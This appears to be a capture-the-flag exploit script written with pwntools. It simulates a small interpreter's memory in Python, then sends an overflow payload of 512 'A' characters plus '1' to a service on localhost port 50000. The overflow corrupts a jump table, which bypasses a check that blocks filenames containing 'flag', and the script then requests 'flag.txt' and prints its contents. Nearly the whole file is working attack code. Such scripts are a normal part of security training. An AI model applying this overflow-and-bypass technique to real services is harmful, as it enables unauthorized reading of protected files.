#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 50000

data = list(('\x77\x69\x74\x68\x20\x6f\x70\x65\x6e\x28\x72\x65\x74\x72\x69\x65\x76\x65\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x28\x22\x66\x69\x6c\x65\x22\x29\x2c\x20\x22\x72\x22\x29\x20\x61\x73\x20\x66\x69\x6c\x3a\x0a\x20\x20\x70\x72\x69\x6e\x74\x28\x66\x69\x6c\x2e\x72\x65\x61\x64\x28\x29\x29\xc3\x69\x66\x20\x22\x66\x6c\x61\x67\x22\x20\x69\x6e\x20\x72\x65\x74\x72\x69\x65\x76\x65\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x28\x22\x66\x69\x6c\x65\x22\x29\x3a\x0a\x20\x20\x65\x78\x69\x74\x28\x30\x29\x0a\x65\x6c\x73\x65\x3a\x0a\x20\x20\x70\x72\x69\x6e\x74\x28\x22\x47\x72\x61\x74\x74\x69\x73\x21\x20\x48\xe4\x72\x20\xe4\x72\x20\x64\x69\x6e\x20\x66\x69\x6c\x3a\x22\x29\xc3\x65\x78\x69\x74\x28\x30\x29\xc3\x70\x72\x69\x6e\x74\x28\x22\x56\xe4\x6c\x6b\x6f\x6d\x6d\x65\x6e\x21\x20\x56\x69\x6c\x6b\x65\x6e\x20\x66\x69\x6c\x20\x76\x69\x6c\x6c\x20\x64\x75\x20\x73\x6d\x61\x6b\x61\x20\x70\xe5\x3f\x22\x29\x0a\x65\x64\x69\x74\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x28\x22\x66\x69\x6c\x65\x22\x2c\x20\x69\x6e\x70\x75\x74\x28\x29\x29\xc3' + '\x00' * 512 + '070000162'))

memory_index = 250
variables = dict()

def edit_variable(name, value):
  global memory_index, variables
  pointer = -1
  if name in variables:
    pointer = variables[name]
  else:
    pointer = memory_index
    variables[name] = memory_index
    memory_index += len(str(value)) + 8
  for ch in str(value) + '\x00':
    if pointer > 762:
      break
    data[pointer] = ch
    pointer += 1

def retrieve_variable(name):
  global variables
  pointer = variables[name]
  value = ""
  while data[pointer] != '\x00':
    value += data[pointer]
    pointer += 1
  try:
    value = int(value)
  finally:
    return value

index = 170
print("".join(data[index:data.index('\xc3', index)]))

edit_variable("file", "A"*512 + '1')
#edit_variable("file", "A"*510 + '1')

for i in range(762, 762+9, 3):
  print(data[i:i+3])
  index = int("".join(data[i:i+3]))
  print("".join(data[index:data.index('\xc3', index)]))

"""
print("Välkommen! Vilken fil vill du smaka på?")
edit_variable("file", input())
if "flag" in retrieve_variable("file"):
  exit(0)
else:
  print("Grattis! Här är din fil:")
with open(retrieve_variable("file"), "r") as fil:
  print(fil.read())
exit(0)

"""

io = remote(HOST, PORT)
io.recvline_contains('Välkommen! Vilken fil vill du smaka på?'.encode())

payload = 'A'*512
payload += '1'
io.sendline(payload.encode())

io.recvline_contains('Välkommen! Vilken fil vill du smaka på?'.encode())
io.sendline('flag.txt'.encode())
flag = io.recvline().decode().strip()
log.info('Flag: %s', flag)
